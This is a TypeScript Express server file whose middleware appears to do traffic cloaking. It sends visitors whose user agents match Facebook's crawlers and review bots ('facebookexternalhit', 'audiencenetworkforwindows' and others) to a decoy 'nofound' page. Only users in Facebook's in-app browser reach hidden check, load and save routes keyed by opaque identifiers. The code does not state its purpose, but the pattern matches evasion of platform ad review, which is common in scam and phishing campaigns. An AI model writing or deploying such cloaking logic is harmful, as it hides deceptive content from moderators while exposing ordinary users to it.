import cors from 'cors';
import morgan from 'morgan';
import Routes from './routes/routes.js';
import * as exphbs from 'express-handlebars';
import express, { Express, Request, Response, NextFunction } from 'express';
import './database/connection.js';
import { CustomRequest } from './utils/custom.request.interface.js';
import { allowCheckWords, allowLoadWords, allowSaveWords } from './utils/allowed_words.js';
import path from 'path';
import { fileURLToPath } from 'url';
import * as http from 'http';
import WebSocketPool from './class/websocketPool.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initializations
const app: Express = express();
const server = http.createServer(app);

// Inicializando servidor WebSockets
WebSocketPool.createWebSocketServer(server);

const port = process.env.PORT || 3000;

// Configura express-handlebars
app.set("view engine", ".hbs");
app.set("views", path.join(__dirname, "views"));
app.engine(".hbs", exphbs.create({
    defaultLayout: "",
    layoutsDir: path.join(app.get("views"), "layouts"),
    partialsDir: path.join(app.get("views"), "partials"),
    extname: ".hbs",
}).engine);

// Middlewares
app.use(cors());
app.use(morgan('dev'));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.disable('x-powered-by');

// Middleware para manejo de errores
app.use((err: any, req: Request, res: Response, next: NextFunction) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

const extractDataFromUrl = (url: string): {
    fileName: string;
    identifier: string;
    checkWord: boolean;
    loadWord: boolean;
    saveWord: boolean;
} | null => {
    const identifierMatch = url.match(/\?([a-zA-Z0-9]{24})/);
    if (!identifierMatch) {
        return null;
    }

    const allowCheckWord = allowCheckWords.some(word => containsWholeWord(url, word));
    const allowLoadWord  = allowLoadWords.some(word => containsWholeWord(url, word));
    const allowSaveWord  = allowSaveWords.some(word => containsWholeWord(url, word));
    if (!allowCheckWord && !allowLoadWord && !allowSaveWord) {
        return null;
    }

    let fileNameMatch: string = "";
    if (allowCheckWord) {
        const matchResult = url.match(/\/([a-zA-Z]{11}\.js)\?/);
        if (!matchResult) {
            return null;
        }
        fileNameMatch = matchResult[1];
    } else if (allowLoadWord) {
        fileNameMatch = "load";
    } else if (allowSaveWord) {
        fileNameMatch = "save";
    } else {
        return null;
    }

    return {
        fileName: fileNameMatch,
        identifier: identifierMatch[1],
        checkWord: allowCheckWord,
        loadWord: allowLoadWord,
        saveWord: allowSaveWord
    };
}

const interceptorMiddleware = (req: CustomRequest, res: express.Response, next: express.NextFunction) => {
    const userAgent = req.headers['user-agent'] || "";
    const extractData = extractDataFromUrl(req.url);

    if (req.url === "/") {
        return next();
    }

    if (req.url.includes('ehloq-check') ||
        req.url.includes('ehloq-load') ||
        req.url.includes('ehloq-save')) {
        return res.status(404).send('Not Found');
    }

    if (!extractData) {
        req.url = '/nofound';
        return next();
    }

    if (!extractData.checkWord && !extractData.loadWord && !extractData.saveWord) {
        req.url = '/nofound';
        return next();
    }

    const forbiddenWordsRegex = /sp1a|width|dalvik|height|density|supportsfresco|scaleddensity|displaymetrics|externalhit_uatext|facebookexternalhit|audiencenetworkforwindows/i;
    if (forbiddenWordsRegex.test(userAgent)) {
        req.url = '/nofound';
        return next();
    }

    // VERIFICADOR DE EHLOQBOOK
    const ehloqbookRegex = /(FB(AN|AV)|\[FB])/i;
    if(!ehloqbookRegex.test(userAgent)){
        return res.status(404);
    }

    req.headers.identifier = extractData.identifier;
    if (req.method === 'GET') {
        if (extractData.checkWord) {
            req.url = '/ehloq-check';
        } else {
            req.url = '/ehloq-load';
        }
    } else if (req.method === 'POST') {
        req.url = '/ehloq-save';
    }

    return next();
};

// Crear una función para verificar si una palabra está contenida como palabra completa
function containsWholeWord(text: string, word: string) {
    const regex = new RegExp(`\\b${word}\\b`);
    return regex.test(text);
}

app.use(interceptorMiddleware);

// Routes
app.use('/', Routes);

server.listen(port, () => {
    console.log(`[server]: Server is running at http://localhost:${port}`);
});